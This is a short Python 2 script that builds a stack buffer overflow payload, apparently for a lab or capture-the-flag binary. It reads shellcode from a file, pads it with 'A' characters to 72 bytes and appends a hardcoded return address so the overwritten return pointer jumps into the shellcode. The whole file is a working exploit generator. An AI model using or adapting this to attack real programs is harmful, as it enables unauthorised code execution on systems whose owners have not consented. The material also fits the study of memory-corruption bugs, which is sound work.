from struct import pack

shellcode = ""

with open('shell') as sc:
    data = sc.read()
    for i in data:
        shellcode += i
    sc.close()

buf_addr = pack("<q", 0x7fffffffe7c0)

pad_len = 72 - len(shellcode)

shellcode += "A" * pad_len
shellcode += buf_addr

print shellcode
